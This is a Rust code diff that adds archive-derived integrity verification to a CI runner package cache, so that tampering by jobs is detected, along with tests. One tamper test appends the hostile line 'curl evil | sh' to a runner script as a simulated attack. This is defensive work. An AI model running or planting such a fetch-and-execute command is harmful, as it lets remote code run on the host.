@@ -56,8 +56,9 @@
 //!
 //! 1. [`InstalledPackage::root`] is **read-only to the caller**. It is the
 //!    shared, immutable source that every runtime is copied or linked from.
-//!    Writing into it corrupts every future runtime, and nothing in this module
-//!    can detect it after the fact.
+//!    Writing into it corrupts every future runtime. What this module offers
+//!    against that is [`PackageContents`], which `e3` checks every runtime
+//!    against; the tree itself cannot be protected from the account that owns it.
 //! 2. [`PackageCache::lease`] must be called for the version a runtime was
 //!    created from, and [`PackageCache::release`] when that runtime is removed.
 //!    **The prune guard is only as truthful as those calls**: a version with no
@@ -1008,6 +1009,338 @@ impl Default for Freshness {
 // InstalledPackage
 // ---------------------------------------------------------------------------
 
+/// What an extracted package must hold, read from the archive whose digest was
+/// verified rather than from the tree it was unpacked into.
+///
+/// Kept in this process's memory and nowhere else. The tree belongs to the
+/// account jobs run as, so a record on disk could be rewritten along with it, and
+/// the published digest covers the archive, not the tree. So a tree this process
+/// did not unpack has no contents to check against, and is downloaded again.
+#[derive(Debug, PartialEq, Eq)]
+pub struct PackageContents {
+    entries: BTreeMap<PathBuf, ExpectedEntry>,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq)]
+enum ExpectedEntry {
+    File {
+        size: u64,
+        sha256: [u8; 32],
+        mode: Option<u32>,
+    },
+    Directory {
+        mode: Option<u32>,
+    },
+    Symlink {
+        target: PathBuf,
+    },
+}
+
+/// How a tree differs from its [`PackageContents`]: a closed set, because what
+/// is in the tree is whatever a job wrote there, and this reaches the log.
+#[derive(Debug, Clone, Copy, PartialEq, Eq, thiserror::Error)]
+pub enum ContentsMismatch {
+    #[error("an entry the archive holds is missing")]
+    Missing,
+    #[error("an entry differs from the archive")]
+    Modified,
+    #[error("an entry the archive does not hold is present")]
+    Unexpected,
+    #[error("an entry could not be read")]
+    Unreadable,
+}
+
+impl ContentsMismatch {
+    /// A fixed word for the log.
+    #[must_use]
+    pub const fn as_str(self) -> &'static str {
+        match self {
+            Self::Missing => "missing",
+            Self::Modified => "modified",
+            Self::Unexpected => "unexpected",
+            Self::Unreadable => "unreadable",
+        }
+    }
+}
+
+/// At most this many threads hash one tree: preparation already runs a bounded
+/// number of launches at once.
+const VERIFY_THREADS: usize = 4;
+
+/// A file's SHA-256 and how many bytes it held.
+fn hash_reader(mut reader: impl Read, buffer: &mut [u8]) -> io::Result<(u64, [u8; 32])> {
+    let mut hasher = Sha256::new();
+    let mut size = 0_u64;
+    loop {
+        match reader.read(buffer)? {
+            0 => return Ok((size, hasher.finalize().into())),
+            read => {
+                hasher.update(&buffer[..read]);
+                size += read as u64;
+            }
+        }
+    }
+}
+
+impl PackageContents {
+    /// Reads what `archive` holds. Its digest must already have been verified.
+    fn of_archive(archive: &Path, kind: ArchiveKind) -> Result<Self, PackageError> {
+        let extract_error = |detail: String| PackageError::Extract { detail };
+        let mut entries = BTreeMap::new();
+        let mut buffer = vec![0_u8; 256 * 1024];
+        let file = fs::File::open(archive).map_err(|source| PackageError::Io {
+            what: "open the runner package archive",
+            path: archive.to_path_buf(),
+            source,
+        })?;
+        match kind {
+            ArchiveKind::Zip => {
+                let mut zip =
+                    zip::ZipArchive::new(file).map_err(|error| extract_error(error.to_string()))?;
+                for index in 0..zip.len() {
+                    let mut entry = zip
+                        .by_index(index)
+                        .map_err(|error| extract_error(error.to_string()))?;
+                    let Some(relative) = entry.enclosed_name().as_deref().and_then(normalised)
+                    else {
+                        continue;
+                    };
+                    let expected = if entry.is_dir() {
+                        ExpectedEntry::Directory {
+                            mode: intended_mode(true, entry.unix_mode()),
+                        }
+                    } else {
+                        let mode = intended_mode(false, entry.unix_mode());
+                        let (size, sha256) = hash_reader(&mut entry, &mut buffer)
+                            .map_err(|error| extract_error(error.to_string()))?;
+                        ExpectedEntry::File { size, sha256, mode }
+                    };
+                    entries.insert(relative, expected);
+                }
+            }
+            ArchiveKind::TarGz => {
+                let mut tar = tar::Archive::new(flate2::read::GzDecoder::new(file));
+                let mut links = Vec::new();
+                for entry in tar
+                    .entries()
+                    .map_err(|error| extract_error(error.to_string()))?
+                {
+                    let mut entry = entry.map_err(|error| extract_error(error.to_string()))?;
+                    let path = entry
+                        .path()
+                        .map_err(|error| extract_error(error.to_string()))?
+                        .into_owned();
+                    let Some(relative) = normalised(&path) else {
+                        continue;
+                    };
+                    let kind = entry.header().entry_type();
+                    let mode = entry
+                        .header()
+                        .mode()
+                        .map_err(|error| extract_error(error.to_string()))?;
+                    let target = entry
+                        .link_name()
+                        .map_err(|error| extract_error(error.to_string()))?
+                        .map(std::borrow::Cow::into_owned);
+                    let expected = match (kind, target) {
+                        (tar::EntryType::Directory, _) => ExpectedEntry::Directory {
+                            mode: intended_mode(true, Some(mode)),
+                        },
+                        (tar::EntryType::Symlink, Some(target)) => {
+                            ExpectedEntry::Symlink { target }
+                        }
+                        // Holds what its target holds, which may come later.
+                        (tar::EntryType::Link, Some(target)) => {
+                            links.push((relative, target));
+                            continue;
+                        }
+                        _ => {
+                            let (size, sha256) = hash_reader(&mut entry, &mut buffer)
+                                .map_err(|error| extract_error(error.to_string()))?;
+                            ExpectedEntry::File {
+                                size,
+                                sha256,
+                                mode: intended_mode(false, Some(mode)),
+                            }
+                        }
+                    };
+                    entries.insert(relative, expected);
+                }
+                for (relative, target) in links {
+                    let held = normalised(&target).and_then(|target| entries.get(&target).cloned());
+                    let held = held.ok_or_else(|| {
+                        extract_error("a hard link names an entry the archive does not hold".into())
+                    })?;
+                    entries.insert(relative, held);
+                }
+            }
+        }
+        // A directory the archive only implies, by holding something inside it.
+        let implied: Vec<PathBuf> = entries
+            .keys()
+            .flat_map(|path| path.ancestors().skip(1))
+            .filter(|ancestor| !ancestor.as_os_str().is_empty())
+            .map(Path::to_path_buf)
+            .collect();
+        for directory in implied {
+            entries
+                .entry(directory)
+                .or_insert(ExpectedEntry::Directory { mode: None });
+        }
+        Ok(Self { entries })
+    }
+
+    /// Adds a file this agent wrote into the tree itself.
+    fn add_file(&mut self, relative: &Path, bytes: &[u8], mode: Option<u32>) {
+        self.entries.insert(
+            relative.to_path_buf(),
+            ExpectedEntry::File {
+                size: bytes.len() as u64,
+                sha256: Sha256::digest(bytes).into(),
+                mode,
+            },
+        );
+    }
+
+    /// Whether `root` holds exactly this and nothing else, top-level `ignored`
+    /// entries aside, reading every file. Off the async thread: on the package's
+    /// ~9,000 files this takes seconds.
+    ///
+    /// # Errors
+    /// The first difference found.
+    pub fn verify(&self, root: &Path, ignored: &[&str]) -> Result<(), ContentsMismatch> {
+        let mut seen = 0_usize;
+        let mut files = Vec::new();
+        let mut pending = vec![root.to_path_buf()];
+        while let Some(directory) = pending.pop() {
+            let listing = fs::read_dir(&directory).map_err(|_| ContentsMismatch::Unreadable)?;
+            for entry in listing {
+                let entry = entry.map_err(|_| ContentsMismatch::Unreadable)?;
+                let path = entry.path();
+                let relative = path.strip_prefix(root).unwrap_or(&path);
+                if directory == root
+                    && ignored
+                        .iter()
+                        .any(|name| entry.file_name() == std::ffi::OsStr::new(name))
+                {
+                    continue;
+                }
+                let expected = self
+                    .entries
+                    .get(relative)
+                    .ok_or(ContentsMismatch::Unexpected)?;
+                seen += 1;
+                // Of the entry itself: a link is never followed.
+                let metadata =
+                    fs::symlink_metadata(&path).map_err(|_| ContentsMismatch::Unreadable)?;
+                let kind = metadata.file_type();
+                match expected {
+                    ExpectedEntry::Directory { mode } if kind.is_dir() => {
+                        check_mode(&metadata, *mode)?;
+                        pending.push(path);
+                    }
+                    ExpectedEntry::Symlink { target } if kind.is_symlink() => {
+                        let held =
+                            fs::read_link(&path).map_err(|_| ContentsMismatch::Unreadable)?;
+                        if held != *target {
+                            return Err(ContentsMismatch::Modified);
+                        }
+                    }
+                    ExpectedEntry::File { size, sha256, mode } if kind.is_file() => {
+                        if metadata.len() != *size {
+                            return Err(ContentsMismatch::Modified);
+                        }
+                        check_mode(&metadata, *mode)?;
+                        files.push((path, *sha256));
+                    }
+                    _ => return Err(ContentsMismatch::Modified),
+                }
+            }
+        }
+        if seen != self.entries.len() {
+            return Err(ContentsMismatch::Missing);
+        }
+        hash_all(&files)
+    }
+}
+
+/// `path` relative to the archive's root; `None` for the root itself, and for
+/// anything that climbs out, which extraction refuses.
+fn normalised(path: &Path) -> Option<PathBuf> {
+    let mut relative = PathBuf::new();
+    for component in path.components() {
+        match component {
+            Component::CurDir => {}
+            Component::Normal(name) => relative.push(name),
+            _ => return None,
+        }
+    }
+    (!relative.as_os_str().is_empty()).then_some(relative)
+}
+
+fn check_mode(metadata: &fs::Metadata, mode: Option<u32>) -> Result<(), ContentsMismatch> {
+    #[cfg(unix)]
+    {
+        use std::os::unix::fs::PermissionsExt as _;
+        if mode.is_some_and(|mode| metadata.permissions().mode() & 0o7777 != mode) {
+            return Err(ContentsMismatch::Modified);
+        }
+    }
+    #[cfg(not(unix))]
+    let _ = (metadata, mode);
+    Ok(())
+}
+
+/// Hashes `files` on a few threads, stopping at the first that differs.
+fn hash_all(files: &[(PathBuf, [u8; 32])]) -> Result<(), ContentsMismatch> {
+    use std::sync::atomic::{AtomicUsize, Ordering};
+
+    let threads = std::thread::available_parallelism()
+        .map_or(1, std::num::NonZero::get)
+        .clamp(1, VERIFY_THREADS);
+    let next = AtomicUsize::new(0);
+    let failure = Mutex::new(None);
+    std::thread::scope(|scope| {
+        for _ in 0..threads {
+            scope.spawn(|| {
+                let mut buffer = vec![0_u8; 256 * 1024];
+                loop {
+                    let lock_failure = || {
+                        failure
+                            .lock()
+                            .unwrap_or_else(std::sync::PoisonError::into_inner)
+                    };
+                    if lock_failure().is_some() {
+                        return;
+                    }
+                    let Some((path, expected)) = files.get(next.fetch_add(1, Ordering::Relaxed))
+                    else {
+                        return;
+                    };
+                    let outcome = fs::File::open(path)
+                        .and_then(|file| hash_reader(file, &mut buffer))
+                        .map_err(|_| ContentsMismatch::Unreadable)
+                        .and_then(|(_, actual)| {
+                            if actual == *expected {
+                                Ok(())
+                            } else {
+                                Err(ContentsMismatch::Modified)
+                            }
+                        });
+                    if let Err(mismatch) = outcome {
+                        *lock_failure() = Some(mismatch);
+                        return;
+                    }
+                }
+            });
+        }
+    });
+    failure
+        .into_inner()
+        .unwrap_or_else(std::sync::PoisonError::into_inner)
+        .map_or(Ok(()), Err)
+}
+
 /// One immutable entry in the cache.
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub struct InstalledPackage {
@@ -1015,6 +1348,8 @@ pub struct InstalledPackage {
     root: PathBuf,
     installed_at: Timestamp,
     digest: Sha256Hex,
+    /// What it holds, when this call unpacked it. See [`PackageContents`].
+    contents: Option<Arc<PackageContents>>,
 }
 
 impl InstalledPackage {
@@ -1027,8 +1362,8 @@ impl InstalledPackage {
     ///
     /// **Read-only to the caller.** Every JIT runtime is a copy or a link from
     /// here (`05-infrastructure.md`), so a write into this directory reaches
-    /// every runtime created afterwards. Nothing in this module can detect such
-    /// a write after the fact; see the module documentation's seam contract.
+    /// every runtime created afterwards. See the module documentation's seam
+    /// contract, and [`Self::contents`] for what catches one.
     #[must_use]
     pub fn root(&self) -> &Path {
         &self.root
@@ -1046,6 +1381,13 @@ impl InstalledPackage {
     #[must_use]
     pub const fn digest(&self) -> &Sha256Hex {
         &self.digest
+    }
+
+    /// What it must hold, read from its verified archive: only when the call
+    /// that returned this unpacked it.
+    #[must_use]
+    pub fn contents(&self) -> Option<Arc<PackageContents>> {
+        self.contents.clone()
     }
 }
 
@@ -1182,10 +1524,10 @@ impl PackageCache {
     ///
     /// For a caller that cannot trust what is on disk. An entry is owned by the
     /// account runners execute as, so a job can rewrite it, and the published
-    /// digest covers the archive rather than the extracted tree, so nothing can
-    /// re-verify an entry after the fact. What this returns was downloaded and
-    /// checked against GitHub's digest by this call, and it is the only entry
-    /// left. The entries set aside are removed once it returns.
+    /// digest covers the archive rather than the extracted tree, so an entry from
+    /// before this process cannot be re-verified. What this returns was downloaded
+    /// and checked against GitHub's digest by this call, with its
+    /// [`PackageContents`], and it is the only entry left. The entries set aside are removed once it returns.
     ///
     /// The install is forced: an entry that reappears at the published
     /// version's path while this runs, as one a job recreated would, is set
@@ -1491,7 +1833,7 @@ impl PackageCache {
         // reached unconditionally, is what makes that a property rather than a
         // hope spread over four early returns.
         let removed = remove_file_if_present(&archive, "remove the package download");
-        let () = outcome?;
+        let mut contents = outcome?;
         removed?;
 
         let guard = StagingGuard::new(extracted.clone());
@@ -1501,7 +1843,15 @@ impl PackageCache {
             installed_at: now,
             filename: download.filename.clone(),
         };
-        write_json(&extracted.join(MANIFEST_FILE), &manifest)?;
+        let manifest_path = extracted.join(MANIFEST_FILE);
+        write_json(&manifest_path, &manifest)?;
+        // Read back rather than trusted: a copy of this tree holds this file too.
+        let written = fs::read(&manifest_path).map_err(|source| PackageError::Io {
+            what: "read back the runner package manifest",
+            path: manifest_path.clone(),
+            source,
+        })?;
+        contents.add_file(Path::new(MANIFEST_FILE), &written, None);
 
         let target = self.version_dir(version);
         create_dir_all(&self.root)?;
@@ -1540,6 +1890,7 @@ impl PackageCache {
                 root: target,
                 installed_at: now,
                 digest: expected.clone(),
+                contents: Some(Arc::new(contents)),
             },
             true,
         ))
@@ -1558,7 +1909,7 @@ impl PackageCache {
         kind: ArchiveKind,
         archive: &Path,
         extracted: &Path,
-    ) -> Result<(), PackageError> {
+    ) -> Result<PackageContents, PackageError> {
         self.ports
             .fetcher
             .fetch(&download.download_url, archive)
@@ -1590,7 +1941,8 @@ impl PackageCache {
         let archive_for_extract = archive.to_path_buf();
         let extracted_for_task = extracted.to_path_buf();
         tokio::task::spawn_blocking(move || {
-            extract(&archive_for_extract, kind, &extracted_for_task)
+            extract(&archive_for_extract, kind, &extracted_for_task)?;
+            PackageContents::of_archive(&archive_for_extract, kind)
         })
         .await
         .map_err(|error| PackageError::Extract {
@@ -1626,6 +1978,7 @@ impl PackageCache {
             root,
             installed_at: manifest.installed_at,
             digest: manifest.digest,
+            contents: None,
         }))
     }
 
@@ -4323,6 +4676,235 @@ mod tests {
             ),
             shared,
         )
+    }
+
+    /// The tree an install unpacked, and what it must hold, for either archive.
+    async fn installed_with_contents(
+        harness: &Harness,
+    ) -> (InstalledPackage, Arc<PackageContents>) {
+        let (installed, downloaded) = harness
+            .cache()
+            .ensure_installed_reporting()
+            .await
+            .expect("installed");
+        assert!(downloaded);
+        let contents = installed.contents().expect("this call unpacked it");
+        (installed, contents)
+    }
+
+    #[tokio::test]
+    async fn what_an_install_unpacked_verifies_against_its_archive() {
+        let (harness, _, _) = linux_fixture();
+        let (installed, contents) = installed_with_contents(&harness).await;
+        assert_eq!(contents.verify(installed.root(), &[]), Ok(()));
+        // An entry found on disk has nothing to vouch for it.
+        assert_eq!(
+            harness
+                .cache()
+                .entry(installed.version())
+                .unwrap()
+                .unwrap()
+                .contents(),
+            None
+        );
+    }
+
+    #[test]
+    fn a_zips_contents_are_read_from_it() {
+        let dir = tempfile::tempdir().unwrap();
+        let archive = dir.path().join("package.zip");
+        fs::write(
+            &archive,
+            zip_bytes(&[("run.cmd", "echo\n"), ("bin/Runner.exe", "bin\n")]),
+        )
+        .unwrap();
+        let into = dir.path().join("tree");
+        extract(&archive, ArchiveKind::Zip, &into).unwrap();
+        let contents = PackageContents::of_archive(&archive, ArchiveKind::Zip).unwrap();
+        assert_eq!(contents.verify(&into, &[]), Ok(()));
+        fs::write(into.join("bin/Runner.exe"), "BIN\n").unwrap();
+        assert_eq!(contents.verify(&into, &[]), Err(ContentsMismatch::Modified));
+    }
+
+    #[test]
+    fn a_tars_links_are_read_from_it() {
+        let dir = tempfile::tempdir().unwrap();
+        let archive = dir.path().join("package.tar.gz");
+        let mut body = tar::Builder::new(Vec::new());
+        let mut file = tar::Header::new_gnu();
+        file.set_size(5);
+        file.set_mode(0o755);
+        file.set_cksum();
+        body.append_data(&mut file, "bin/run", &b"run!\n"[..])
+            .unwrap();
+        for (kind, name, target) in [
+            (tar::EntryType::Symlink, "latest", "bin/run"),
+            (tar::EntryType::Link, "bin/again", "bin/run"),
+        ] {
+            let mut link = tar::Header::new_gnu();
+            link.set_entry_type(kind);
+            link.set_size(0);
+            link.set_mode(0o777);
+            body.append_link(&mut link, name, target).unwrap();
+        }
+        let tarball = body.into_inner().unwrap();
+        let mut gz = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::fast());
+        gz.write_all(&tarball).unwrap();
+        fs::write(&archive, gz.finish().unwrap()).unwrap();
+
+        let contents = PackageContents::of_archive(&archive, ArchiveKind::TarGz).unwrap();
+        assert_eq!(
+            contents.entries.get(Path::new("bin/again")),
+            contents.entries.get(Path::new("bin/run")),
+            "a hard link holds what its target holds"
+        );
+        assert!(matches!(
+            contents.entries.get(Path::new("latest")),
+            Some(ExpectedEntry::Symlink { .. })
+        ));
+        assert!(matches!(
+            contents.entries.get(Path::new("bin")),
+            Some(ExpectedEntry::Directory { mode: None })
+        ));
+    }
+
+    /// Every way a job could change what the next runner executes.
+    #[tokio::test]
+    async fn a_tree_that_differs_from_its_archive_in_any_way_does_not_verify() {
+        let cases: Vec<(&str, ContentsMismatch, fn(&Path))> = vec![
+            ("same size, new bytes", ContentsMismatch::Modified, |root| {
+                let run = root.join("run.sh");
+                let mut bytes = fs::read(&run).unwrap();
+                bytes[0] ^= 1;
+                fs::write(run, bytes).unwrap();
+            }),
+            ("appended", ContentsMismatch::Modified, |root| {
+                let mut file = fs::OpenOptions::new()
+                    .append(true)
+                    .open(root.join("run.sh"))
+                    .unwrap();
+                file.write_all(b"curl evil | sh\n").unwrap();
+            }),
+            ("a file planted", ContentsMismatch::Unexpected, |root| {
+                fs::write(root.join("planted.sh"), "x").unwrap();
+            }),
+            (
+                "a directory planted",
+                ContentsMismatch::Unexpected,
+                |root| {
+                    fs::create_dir(root.join("planted")).unwrap();
+                },
+            ),
+            ("removed", ContentsMismatch::Missing, |root| {
+                fs::remove_file(root.join("run.sh")).unwrap();
+            }),
+        ];
+        for (what, expected, edit) in cases {
+            let (harness, _, _) = linux_fixture();
+            let (installed, contents) = installed_with_contents(&harness).await;
+            edit(installed.root());
+            assert_eq!(
+                contents.verify(installed.root(), &[]),
+                Err(expected),
+                "{what}"
+            );
+        }
+    }
+
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn a_mode_or_a_link_changed_in_the_tree_does_not_verify() {
+        use std::os::unix::fs::PermissionsExt as _;
+
+        let (harness, _, _) = linux_fixture();
+        let (installed, contents) = installed_with_contents(&harness).await;
+        let run = installed.root().join("run.sh");
+        let mode = fs::metadata(&run).unwrap().permissions().mode();
+        fs::set_permissions(&run, fs::Permissions::from_mode(mode ^ 0o100)).unwrap();
+        assert_eq!(
+            contents.verify(installed.root(), &[]),
+            Err(ContentsMismatch::Modified)
+        );
+
+        fs::set_permissions(&run, fs::Permissions::from_mode(mode)).unwrap();
+        assert_eq!(contents.verify(installed.root(), &[]), Ok(()));
+
+        // A link to a copy with the same bytes still reads as changed.
+        let elsewhere = installed.root().with_file_name("elsewhere");
+        fs::copy(&run, &elsewhere).unwrap();
+        fs::remove_file(&run).unwrap();
+        std::os::unix::fs::symlink(&elsewhere, &run).unwrap();
+        assert_eq!(
+            contents.verify(installed.root(), &[]),
+            Err(ContentsMismatch::Modified)
+        );
+    }
+
+    /// A persistent slot's retained work folder is the job's own, at the top
+    /// only: one anywhere else is planted.
+    #[tokio::test]
+    async fn only_a_top_level_ignored_entry_is_ignored() {
+        let (harness, _, _) = linux_fixture();
+        let (installed, contents) = installed_with_contents(&harness).await;
+        fs::create_dir(installed.root().join("_work")).unwrap();
+        fs::write(installed.root().join("_work/job"), "x").unwrap();
+        assert_eq!(contents.verify(installed.root(), &["_work"]), Ok(()));
+        assert_eq!(
+            contents.verify(installed.root(), &[]),
+            Err(ContentsMismatch::Unexpected)
+        );
+    }
+
+    /// What 0.4.49 trusted without reading: an edit the tree's look does not show,
+    /// as on Windows, where there is no fingerprint at all. The runtime it reached
+    /// is not used, the shared tree goes, and the next attempt prepares a clean one.
+    #[tokio::test]
+    async fn a_copy_of_an_edited_package_is_discarded_and_the_package_prepared_again() {
+        use crate::lifecycle::{PackageTimings, RuntimePackages as _};
+
+        let (harness, _, _) = linux_fixture();
+        let (one, _two, shared) = two_targets(&harness);
+        let first = reserved(&harness, 1);
+        let mut timings = PackageTimings::default();
+        one.materialize(&first, &mut timings).await.expect("clean");
+        assert!(timings.verify > std::time::Duration::ZERO, "it was read");
+        let entry = harness.cache().installed().unwrap().remove(0);
+        assert!(shared.vouches_for(entry.root()));
+
+        let run = entry.root().join("run.sh");
+        let mut bytes = fs::read(&run).unwrap();
+        bytes[0] ^= 1;
+        fs::write(&run, &bytes).unwrap();
+        shared.blind_to_edits_of(entry.root());
+
+        let second = reserved(&harness, 2);
+        let refused = one
+            .materialize(&second, &mut PackageTimings::default())
+            .await;
+        assert_eq!(refused.unwrap_err(), FailureReason::ProcessStartFailed);
+        assert!(
+            !second.runtime_path().exists(),
+            "the copy is not left to use"
+        );
+        assert!(
+            harness
+                .cache()
+                .holders(entry.version())
+                .unwrap()
+                .iter()
+                .all(|holder| *holder != second.id)
+        );
+        assert!(!shared.vouches_for(entry.root()));
+        assert_eq!(harness.fetcher.count(), 1);
+
+        one.materialize(&second, &mut PackageTimings::default())
+            .await
+            .expect("prepared again");
+        assert_eq!(harness.fetcher.count(), 2);
+        assert_ne!(
+            fs::read(second.runtime_path().join("run.sh")).unwrap(),
+            bytes
+        );
     }
 
     /// An address that answers with `head`, then whatever `then` sends.
